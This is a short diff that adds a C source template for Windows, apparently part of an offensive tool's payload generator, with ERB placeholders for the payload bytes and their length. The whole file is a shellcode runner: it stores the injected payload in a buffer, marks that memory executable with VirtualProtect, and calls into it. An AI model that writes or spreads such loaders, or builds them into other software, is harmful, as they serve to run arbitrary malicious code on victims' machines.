@@ -1,0 +1,11 @@
+#include <Windows.h>
+
+#define SCSIZE <%= payload_length %>
+char bPayload[SCSIZE] = "<%= payload %>";
+
+void main() {
+	DWORD dwOldProtect;
+	VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+	(*(void (*)()) bPayload)();
+	return;
+}
